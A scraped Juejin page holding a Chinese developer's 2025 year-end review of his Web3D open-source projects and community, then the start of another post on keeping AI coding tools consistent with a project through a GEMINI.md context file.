                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">2025 年终总结：25 岁，从“混吃等死”到别人眼中的“技术专家”</h2>
<p>两年前的春节假期，某天。在一所面积不大、紧邻国道的廉租房里，住着三个人。</p>
<p>那时的我，还是个凭运气混进大公司、天天写 CRUD 混吃等死的前端“小卡拉米”。趁着春节假期，我戴着耳机，沉浸在游戏世界里。突然，客厅传来一声闷响。</p>
<p>我疑惑地摘下耳机：“什么声音？”</p>
<p>回头望去，我看到奶奶仰面躺在沙发上——她晕倒了。</p>
<p>那是我第一次见到我最亲爱的亲人（我是单亲+留守儿童）病倒在面前。慌乱中，我给在外打牌的父亲拨去了电话。最后<strong>所幸</strong>并无大碍，但在那一刻，我知道：<strong>我不能再这样混下去了，我需要努力。</strong></p>
<p>两年后的今天，再回头看：</p>
<ul>
<li>我成为了团队中不可或缺的技术核心</li>
<li>我成为了稀土掘金 2025 年度优秀创作者</li>
<li>我开源的项目累计获得 1K+ GitHub Star</li>
<li>我开始频繁出现在 Three.js 官方推特的转发列表中</li>
<li>也第一次，被别人称为「技术专家」</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a0410fe20874471b90aca12aafb89bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=FRTWNwlLxUe9Fph9IEB%2BTo%2FU2sI%3D" alt="111.gif" loading="lazy"/></p>
<h3 data-id="heading-1">前言：前端版“萧炎”？不，是鸽子王</h3>
<p>我无意想去将过去两年到底是如何度过的写成文章，把这篇年终总结写成“前端版萧炎”的<strong>自传</strong>。老实说我也想不起来是怎么过的。上面那段沉重的开场白，就当是我为自己小小的骄傲一下吧。</p>
<p>好了！STOP！沉重的话题到此为止。让我们一起来看看，<strong>“鸽子王”老何</strong>今年到底干了些什么事吧！</p>
<h3 data-id="heading-2">1.所在之平台：数据与感谢</h3>
<p>首先，让我们来看看今年在平台上的具体“战绩”。今年一共写了多少篇文章呢？</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3deeb7f549ea4af388c6fb93fd50e3bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=JocLRT6%2Bn83Ut43G7bFA2G%2Fk8gg%3D" alt="更新频率.png" loading="lazy"/></p>
<p><strong>哇！居然有足足 9 篇之多！</strong> 这个数量真是闻者伤心、听者落泪，运营看了想打人（右边狐尼克真的是运营催更我时的表情 be like...）。不过好在数据还算过得去，收获了 <strong>1217 名粉丝</strong>。真的特别特别感谢你们！不多说了，就我这“随缘更新”的频率还能有粉丝，真的得给“<strong>义父们</strong>”磕一个。</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94deb121ec444c4786e7733bf287cfc9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=JVIDmwZS1VdnaIB7Ezx29v24P50%3D" alt="感谢 给你磕头 GIF 动图_爱给网_aigei_com.gif" loading="lazy"/></p>
<p>在此期间，我也收获了非常不错的流量，感谢各大网友、群友和平台运营老师的大力扶持。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/29e2ba78ccfa4b4f954138ef459e80d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=UJx8Yf1kJQURcs%2FG0x3VmNfqto4%3D" alt="222.png" loading="lazy"/></p>
<p>最终，我获得了 <strong>「稀土掘金 2025 年度优秀创作者」</strong> 的荣誉。当时运营老师通知我的时候，我的第一反应是：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37608b2cccc4463492a7bc425c43bdc8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=vTX9B%2B0TSukM53%2F9dtHsY39Oyd8%3D" alt="11111111111111111.png" loading="lazy"/></p>
<blockquote>
<p><strong>泰裤辣！兄弟们也是好起来了！</strong></p>
</blockquote>
<p>说真的，能拿这个奖完完全全归功于万能的群友们和运营老师满满的 Push，是你们的监督让我得以将写文章的习惯（勉强）坚持下去！</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19ed1e4e912c49ee91e47c7caa3b037b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=V2xXV3irFR8rnbmeWzlKjt3Egcs%3D" alt="微信圖片_20260108111207_10_110.jpg" loading="lazy"/></p>
<h3 data-id="heading-3">2.所做之项目：从“夯”到“拉”的锐评</h3>
<p>来到项目环节，让我以极其客观（自我检讨）的视角，锐评一下今年开源的项目吧！</p>
<h4 data-id="heading-4">🏝️ Island —— 2.5D 卡通风个人简历\</h4>
<blockquote>
<p><strong>自我评价：人上人</strong></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8911dac514c4474a9234451df7d34a07~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=m9X7ieqZkWLaeCqnBCmj2roQ1MA%3D" alt="island.gif" loading="lazy"/></p>
<p><a href="https://juejin.cn/post/7498914140166799397" target="_blank" title="https://juejin.cn/post/7498914140166799397"><code>island</code></a> 对现在的我来说，确实存在不少问题：</p>
<ul>
<li><strong>画面风格</strong>：三渲二的效果还需优化，仔细看距离小时候在 PSP 上玩的游戏风格还有差距，后续计划加入自定义后处理通道来调节。</li>
<li><strong>UI 设计</strong>：当时用 DALL·E 3 生成的 UI 比较简陋，后续会用 <strong>Nano-banana-pro</strong> 全面改进 UI 风格。</li>
<li><strong>兼容性</strong>：移动端适配？不存在的，手机和平板用户只能干瞪眼 = =。</li>
<li><strong>交互性</strong>：可互动内容单调，靠近物体没有视觉反馈。</li>
<li><strong>展示方式</strong>：玩家需要到场景上方点击告示牌展示新项目，方式太单一，和网页没啥区别！</li>
</ul>
<p>但话又说回来，这确实是我第一个有点“出圈”的项目。也许每个人回看以前的代码都会觉得稚嫩，左看右看能挑出一堆毛病，但不可否认它在我心中的地位。综合下来，给个**“人上人”**的评价！后面的改动还能在掘金多水两篇文章，美滋滋。</p>
<h4 data-id="heading-5">🏙️ CubeCity —— 卡通城市放置系统</h4>
<blockquote>
<p><strong>自我评价：项目顶尖，作者“拉完了”</strong></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4788327e533841ff9f95e71ea05b4bb0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=B0tL3n6mY9cuOuidKRnqgdAbbf0%3D" alt="游玩时动图.gif" loading="lazy"/></p>
<p><a href="https://juejin.cn/post/7538715423534399534" target="_blank" title="https://juejin.cn/post/7538715423534399534"><code>CubeCity</code></a> 是我 GitHub 上 Star 最多的项目，单个项目贡献了 <strong>877 Star</strong>。玩法参考了《卡牌城镇》，支持随意建造、拆除、升级、搬迁建筑。UI 贴合 Low Poly 风格，在国外社区也很讨喜。</p>
<p>但 Star 多不代表没问题：</p>
<ul>
<li><strong>性能</strong>：渲染帧率堪忧，比如 GTX 1660 Ti 这种显卡都跑不满 60 FPS。</li>
<li><strong>生气</strong>：道路上没有汽车和小人跑动，城市显得空荡荡。</li>
<li><strong>兼容性</strong>：移动设备又双叒没做兼容？！GitHub 上提的 Issue 也不回？可恶的鸽子王！</li>
<li><strong>功能缺失</strong>：说好的成就系统呢？经济系统呢？社交排行榜呢？</li>
</ul>
<p>何贤你在干嘛？总而言之，这个项目简直是<strong>鸽到没朋友，最鸽的一集</strong>！X 上评论不回，GitHub 上 Issue 装死。要不是项目底子还行，我真的要骂人了！</p>
<p>综合下来项目给到<strong>顶尖</strong>，但是开发者给到 <strong>拉完了</strong> 啊！</p>
<h4 data-id="heading-6">Third-Person-MC——第三人称我的世界</h4>
<blockquote>
<p><strong>自我评价：夯</strong></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/13b59621537949ed8c9474085286dac1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=3hNFDawVjAYajgn9S27GIsCgKc8%3D" alt="03.gif" loading="lazy"/></p>
<p>这个项目掘友们可能没怎么听过，但在群里应该多多少少见识过。这是目前对我来说最复杂的一个项目！</p>
<p>该项目具备多种生态地貌、无限地形生成与自适应相机等核心特性，<strong>不久的将来</strong>，即将正式登陆掘金平台与大家见面。至于是否会进一步扩展联机系统，目前尚无定论。相关内容，我会在后续发布的专题文章中为大家详细解读。</p>
<p>总体来说还不错！实机测试在 GTX 1660 Ti 的笔记本上也能稳定 30 帧！算是一个非常有意思的探索。综合评价：<strong>夯</strong>。</p>
<hr/>
<p>好了好了打住！今年说实话还是开源了不少项目！但是不能在这占用篇幅！在此我直接就是一个项目大合影</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b540ba7f3024f33a8b3d31035dfd988~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=hQKO%2BpWvXgYlAqEx%2BExn0jdvVVw%3D" alt="Snipaste_2026-01-08_14-36-36.png" loading="lazy"/></p>
<p>以及对于我来说所有项目<strong>从夯到拉</strong>的排名如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/781a3e51f71f4bd1bb7752dbd8eac5ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=dfYHqt%2F2JERJjxDRl8vJ4CEsqDY%3D" alt="我的从夯到拉.png" loading="lazy"/></p>
<h3 data-id="heading-7">3.所遇之好友：良师益友</h3>
<p>近年最幸运的事，就是遇到了一个很好的领导，以及一群志同道合、相互勉励的朋友。</p>
<h4 data-id="heading-8">关于“冷爷”</h4>
<p>在工作上，我遇到了一位好领导，但我更愿称他为好朋友——<strong>冷爷</strong>。 平时群友或合作伙伴可能觉得我是个温和的人，可一旦切入工作模式，我就会变成大家口中的“压力怪”。因此曾有一段时间，我和办公环境有些格格不入。冷爷作为 Leader，真的起到了至关重要的润滑作用。 生活中，冷爷也经常带我出去玩。那段时间我真是“两耳不闻窗外事，一心只想学技术”，彻彻底底的宅男一枚。要不是冷爷拉着我游山玩水，我可能真就成了那种“代码敲得飞起、话却说不清楚”的刻板极客。 他是一个好领导，更是一个好朋友。<strong>在这里想对冷爷说一声：谢谢！</strong></p>
<h4 data-id="heading-9">关于 Web3D 圈子</h4>
<p>随着深入学习 Web3D，我微信里多了很多耕耘于此的朋友。虽然大家细分领域不同——有做可视化大屏的，有做 3D 看车/看房的，有研究 NVIDIA Isaac Sim 的，也有做数字工厂/机械臂的。甚至有些曾是我在视频网站上仰望的偶像，现在也成了列表好友。</p>
<p>大家聚在一起分享技术，扯皮打趣，大佬们时不时冒泡答疑。这个圈子很小，抬头不见低头见，但真的很少出现拉踩或诋毁。<strong>我是在群友们的“夸夸”中一步步走到这里的。</strong> 这种正反馈非常奇妙：动力来自群友的鼓励和大佬的认可，而这些又促使我创造出更好的项目！</p>
<h3 data-id="heading-10">4. 所想：运气表面积</h3>
<p>最近我了解到一个非常有趣的观点，叫 <strong>Luck Surface Area（运气表面积）</strong>，最早来自 Jason Roberts：</p>
<blockquote>
<p>你生活中会有多少‘无心插柳柳成荫’的意外之喜？这取决于你的‘运气表面积’。 <strong>LSA（运气） = P（热爱/做事的深度） × C（传播/连接的广度）</strong></p>
</blockquote>
<p>这个乘法关系很神奇，意味着如果其中一项为零，总结果就为零：</p>
<ul>
<li><strong>只有热爱 (P)，没有传播 (C) = 孤独的耕耘者</strong> 如果你对某事极度热爱，技艺精湛，但把自己关在地下室里，从不向外界展示，那么你的“运气表面积”几乎为零。外界的机会无法穿透墙壁找到你，“酒香也怕巷子深”。</li>
<li><strong>只有传播 (C)，没有热爱 (P) = 空洞的喧哗者</strong> 如果你擅长营销，但传播的内容缺乏内核，不是你真正热爱或擅长的东西，你可能短期获得关注，但无法建立深度的信任，真正的“好运”依然很难降临。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ee7f36435a04d7c9ad14356b3cc85f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=1wnXfZ39dgepKqzPaeFzA1vbSBc%3D" alt="Gemini_Generated_Image_bxxtb0bxxtb0bxxt.png" loading="lazy"/>
我觉得我是非常幸运的。<strong>优秀的 Web3D 作品天然具有视觉冲击力和社交属性</strong>，而稀土掘金平台很好地承担了“传播”的职责！</p>
<p>所以，并不是我选择了这个平台，而是我遇到的人、事以及平台给予的正反馈激励着我！非常感谢能看到这里的你！</p>
<h3 data-id="heading-11">5. 所规划之未来</h3>
<p>2026 年会是什么样？我不知道。它会是我的“三年之约”，我希望自己能变成更好的人。</p>
<p>但我确定我一定会：</p>
<ul>
<li>🛠️ <strong>填坑</strong>：优化那些我没有完善好的项目（别骂了别骂了）。</li>
<li>✨ <strong>创造</strong>：产出更多有趣的项目和技术文章。</li>
<li>🤝 <strong>连接</strong>：认识更多志同道合的朋友。</li>
<li>🌐 <strong>布道</strong>：将 Web3D 的魅力分享给更多的人。</li>
</ul>
<h3 data-id="heading-12">6.三年之约，你会如约而至吗？</h3>
<p><strong>最后，如果你愿意，也在这篇文章的评论区留下属于你的「三年之约」吧！</strong></p>
<p>无论是技术的精进、生活的改变，还是一个简单的愿望。让我们约定在未来的某一天回头看，一起见证彼此的蜕变！🚀</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🧠 2025：AI 写代码越来越强，但我的项目返工却更多了]]></title>    <link>https://juejin.cn/post/7592710766010040330</link>    <guid>https://juejin.cn/post/7592710766010040330</guid>    <pubDate>2026-01-08T08:04:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592710766010040330" data-draft-id="7592816646869483529" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🧠 2025：AI 写代码越来越强，但我的项目返工却更多了"/> <meta itemprop="keywords" content="前端,机器学习,AI编程"/> <meta itemprop="datePublished" content="2026-01-08T08:04:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="webkubor"/> <meta itemprop="url" content="https://juejin.cn/user/2119514149631870"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🧠 2025：AI 写代码越来越强，但我的项目返工却更多了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2119514149631870/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    webkubor
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:04:13.000Z" title="Thu Jan 08 2026 08:04:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    20
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2025 年之前，我对 AI 编程工具的态度一直很矛盾。</p>
<p>它很强，但在真实项目里，<strong>并不可靠</strong>。</p>
<p>写 Demo、写局部代码很爽；</p>
<p>一进真实工程，就开始暴露问题：</p>
<p>忘规范、忘约定、忘上下文，甚至忘掉我刚强调过的规则。</p>
<p>后来我才意识到，问题不在模型能力，而在<strong>上下文与记忆的管理方式</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b8ab7f75eaa54fd3a7218676cc4de74e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2Via3Vib3I=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768468656&amp;x-signature=pvlKHEWyLd%2B0yhnjYAKguBqq1%2BI%3D" alt="截屏2026-01-08 16.57.12.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-0"><strong>一、真正的痛点：AI 写得快，但项目总是被“写歪”</strong></h2>
<p>作为前端工程师，我最痛苦的从来不是“代码难写”，而是<strong>返工成本</strong>。</p>
<p>常见情况包括：</p>
<ul>
<li>
<p>明明是 <strong>TypeScript + 函数式优先</strong>，却不断生成松散的 JS 风格</p>
</li>
<li>
<p>项目已有稳定的接口 DTO、目录结构，它还是会“自创一套”</p>
</li>
<li>
<p>对话一长，前后输出开始不一致，甚至互相冲突</p>
</li>
</ul>
<p>一开始我以为是“我不会提问”，</p>
<p>后来发现不是。</p>
<p><strong>AI 最大的问题，是它根本不理解我的项目，更不可能长期记住它。</strong></p>
<hr/>
<h2 data-id="heading-1"><strong>二、转折点：我不再重复解释，而是让项目自己“说话”</strong></h2>
<p>真正的改变，来自我开始使用 <strong>Gemini CLI + 持久化上下文</strong>。</p>
<p>我做的第一件事很简单：</p>
<p>在项目根目录创建一个 GEMINI.md 文件。</p>
<p>它不是 Prompt 集合，而是<strong>项目规则本身</strong>：</p>
<ul>
<li>
<p>技术栈与编码规范</p>
</li>
<li>
<p>目录与模块约定</p>
</li>
<li>
<p>输出必须满足的验收条件</p>
</li>
</ul>
<p>从那一刻开始，我不再对 AI 说“记住这一点”，</p>
<p>而是默认它<strong>进入项目就自动加载这些规则</strong>。</p>
<blockquote>
<p>我第一次意识到： <strong>上下文不该存在于对话里，而应该属于项目本身。</strong></p>
</blockquote>
<p>比如如图所示</p>
